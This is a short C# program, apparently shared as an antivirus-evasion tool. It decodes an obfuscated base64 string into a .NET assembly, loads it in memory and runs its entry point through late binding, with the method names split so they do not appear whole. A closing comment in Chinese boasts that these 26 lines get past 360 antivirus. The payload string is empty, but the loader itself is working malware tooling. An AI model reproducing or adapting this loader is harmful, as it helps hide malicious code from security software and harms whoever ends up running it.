using System;
using Microsoft.VisualBasic.CompilerServices;

namespace xx
{
    public static class XXX
    {
        public static void Main()
        {
            string m = "";  //base64加密密文
            byte[] Bytes = Convert.FromBase64String(m.Replace("#", "A").Replace("*", "T"));
            object Assembly = Assembly_Load(Bytes);
        }
        public static byte[] Assembly_Load(byte[] Bytes)
        { 
            object Nothin = null;
            object Objec = new object[0] { };
            object NewObje = new object[][] { (object[])Nothin, (object[])Nothin };
            System.Object Reflectio = System.Reflection.Assembly.Load(Bytes);
            object LateCall = NewLateBinding.LateGet(Reflectio, (Type)Nothin, "Entry" + "Point", (object[])Objec, (string[])Nothin, (Type[])Nothin, (bool[])Nothin);
            object Binding = NewLateBinding.LateCall(LateCall, (Type)Nothin, "Inv" + "oke", (object[])NewObje, (string[])Nothin, (Type[])Nothin, (bool[])Nothin, true);
            return (byte[])Binding;
        }
    }
}
//26行代码过360杀毒